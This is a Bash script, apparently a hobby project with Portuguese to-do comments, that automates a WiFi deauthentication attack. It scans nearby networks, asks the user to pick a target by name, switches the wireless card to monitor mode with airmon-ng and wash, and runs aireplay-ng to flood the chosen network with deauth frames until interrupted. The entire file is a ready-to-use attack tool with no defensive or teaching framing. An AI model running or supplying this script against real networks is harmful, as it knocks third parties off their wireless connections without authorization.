#!/bin/bash

# contributors: mel, cr0d, rck, kd, vm, ... 

# --- TO DO ---

#-------
# Traduzir novos fragmentos para inglês
#-------
#Capturar o nome das redes wireless do arquivo temporário e passar para um array

#Dar um echo neste array, mostrando o número da posição do array +1 e o nome da rede, no seguinte formato
#1;Rede 01
#2;Rede 02
#3;Rede Wireless
#-------
#Pegar o canal do array com o nº da linha (posição do array +1) com: head -n 2 redes.csv | tail -n 1
#-------
# Ajustar seleção de redes wireless, ao passar 0 -> reescanear redes.
#1;Rede 01
#2;Rede 02
#3;Rede Wireless
#Pressione 0 para reescanear as redes wireless
#-------
# Tentar descobrir qual o erro que mostra o nome de algumas redes com nomes repetidos & outras com nome pela metade
#-------

# ==== PERFUMARIAS DESNECESSÁRIAS :) ====
# Criar um parser para as redes wireless, para mostrá-las neste formato
#   +----+---------------+
#   | Id | Network       |
#   |  1 | Rede 01       |
#   |  2 | Rede 02       |
#   |  3 | Rede Wireless |
#   |  4 |               |
#   |  5 |               |
#   |  6 |               |
#   +----+---------------+


usage()
{
    echo -e "\nUsage: sudo bash ./deauth_attack.sh <args>"
    echo -e "\nOptional Arguments:"
    echo "-n \"<name>\"       : The network name which the attack will be performed"
    echo "-k                : Plays a nice keygen music while the attack is running"
#    echo "-s <y,n>          : Don't show the DeAuth messages when performing the attack [Default:n]"
    echo "-h                : Show this help message"
}

[ "$EUID" -eq 0 ] || { 
    usage 
    echo "NOTE: most of the commands need \"root\"";
    exit;
}

for CMD in route airmon-ng mktemp iwlist iwconfig wash getopt pkill
do
    if [ ! `which $CMD` ]
    then
        echo "[ERROR] Missing command/app \"$CMD\". Install it first."
        echo -e "\nPackages you need to install (Debian, Ubuntu, ...): "
        echo "aircrack-ng\n- reaver\n- wireless-tools\n- ..."
#        echo -e "\nE.g.: sudo apt-get -y install aircrack-ng reaver wireless-tools"
        echo "Para airmon-ng, instale o pacote aircrack-ng."
        echo "Para route, instale o pacote net-tools."
        echo "Para wash, instale o pacote reaver."
        exit
    fi
done

# find WiFi net interface
INTERFACE=`iwconfig 2> /dev/null | grep 'IEEE 802.11' | awk '{print $1}'`
# tmp file
TMP_FILE=$(mktemp)

# stop airmon-ng and start WiFi interface in normal mode
reset_net_config()
{
    echo -n "Re-setting WiFi network configuration ... "
    airmon-ng stop $INTERFACE"mon" 1> /dev/null
    service network-manager start 1> /dev/null
    sleep 5
    echo "done."
}

check_promiscuous_mode()
{
    echo -n "Checking whether promiscuous mode is ON ... "
    if [ -z "$INTERFACE" ]
    then
        NET_IFACE="$(airmon-ng | grep "mon" | cut -f 2)"
        INTERFACE="${NET_IFACE::-3}"
        reset_net_config
    fi
    echo "done."
    echo "Network interface: "$INTERFACE
}

# parse WiFi network names from iwlist's output
parse_iwl()
{
    while IFS= read -r line; do
        [[ "$line" =~ \(Channel ]] && {
            chn=${line##*nel };
            chn=${chn:0:$((${#chn}-1))};
        }
        [[ "$line" =~ ESSID ]] && {
            essid=${line##*ID:}
            echo "$essid;$chn"
        }
    done
}

# find available networks
scan_networks()
{
    echo -n "Scanning WiFi networks ... "
    iwlist $INTERFACE scan | parse_iwl > $TMP_FILE
    echo "done."
}

#Função executa se o usuário passar o nome da rede como parâmetro
choose_network()
{
    echo -e "\n-- networks found: --"
    # list network names
    cat $TMP_FILE | cut -d";" -f1 | sed -e 's/^"//' -e 's/"$//'
    echo -n  -e "\nType in the network name you want to attack: "
    read NETWORK
}

#Testa se o nome da rede é válido, evitando futuros erros
verify_network()
{
    echo -n "Verifying network ... "
    REDE_VALIDA=0
    IFS=";"
    while read f1 f2
    do
        temp="${f1//\"}"
        if [ "$temp" == "$NETWORK" ]
        then
            REDE_VALIDA=1 
            break
        fi
    done < $TMP_FILE
    echo "Done."
}


echo "

▓█████▄▓█████▄▄▄      █    ██▄▄▄█████▓██░ ██     ▄▄▄    ▄▄▄█████▄▄▄█████▓▄▄▄      ▄████▄  ██ ▄█▀
▒██▀ ██▓█   ▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒   ▒████▄  ▓  ██▒ ▓▓  ██▒ ▓▒████▄   ▒██▀ ▀█  ██▄█▒ 
░██   █▒███ ▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░   ▒██  ▀█▄▒ ▓██░ ▒▒ ▓██░ ▒▒██  ▀█▄ ▒▓█    ▄▓███▄░ 
░▓█▄   ▒▓█  ░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░░▓█ ░██    ░██▄▄▄▄█░ ▓██▓ ░░ ▓██▓ ░░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄ 
░▒████▓░▒████▓█   ▓██▒▒█████▓  ▒██▒ ░░▓█▒░██▓    ▓█   ▓██▒▒██▒ ░  ▒██▒ ░ ▓█   ▓██▒ ▓███▀ ▒██▒ █▄
▒▒▓  ▒░░ ▒░ ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░   ▒ ░░▒░▒    ▒▒   ▓▒█░▒ ░░    ▒ ░░   ▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒
░ ▒  ▒ ░ ░  ░▒   ▒▒ ░░▒░ ░ ░    ░    ▒ ░▒░ ░     ▒   ▒▒ ░  ░       ░     ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░
░ ░  ░   ░   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░     ░   ▒   ░       ░       ░   ▒  ░       ░ ░░ ░ 
░      ░  ░    ░  ░  ░             ░  ░  ░         ░  ░                    ░  ░ ░     ░  ░   
░                                                                               ░              
"
echo "[DeAuthAttack] BEGIN"

while getopts "n:h:k" opt; do
    case "$opt" in
        n)
            NETWORK=$OPTARG ;;
        h)
            usage 
            exit ;;
        k)
            if [ ! `which mplayer` ]
            then
                echo "Needs mplayer for playing keygen music. Please install it."
            else
                mplayer -loop 0 -noconsolecontrols -really-quiet 2>/dev/null keygen.mp3 &
            fi
            ;;
    esac
done
check_promiscuous_mode
scan_networks

#Se a network não foi setada, não foi passada como parâmetro logo,
#Devemos pedir para o usuário inserir a rede
if [ -z ${NETWORK+x} ];
    then
        choose_network
fi

#Verifica se a rede inserida está no arquivo temporário
verify_network
if [ $REDE_VALIDA == 0 ]
then
    echo "Network not found."
    exit
fi

# get the correct channel of the selected network
CHANNEL="$(cat $TMP_FILE | grep -i "$NETWORK" | cut -d";" -f2)"
echo "Network channel: $CHANNEL"

echo -n "Starting attack tools ... "
airmon-ng start $INTERFACE 1> /dev/null
airmon-ng check kill 1> /dev/null
echo "done."

echo -n "Changing the WiFi network channel ... "
wash -i $INTERFACE"mon" -c $CHANNEL -C -o /dev/null -D 2> /dev/null
# wait a bit before killing the process
sleep 2
pkill wash
echo "done."

echo -n "Starting the attack ... "
aireplay-ng -0 0 -e "$NETWORK" $INTERFACE"mon" &

# trap <ctrl+c> signal
trap " " SIGINT
# wait until the user types <ctrl+c> to end the attacking script
wait
# kill the attack process
kill $!
# redirect kill's output to /dev/null
wait $! 2>/dev/null

echo -e "\n[DeAuthAttack] FINISHED"

reset_net_config
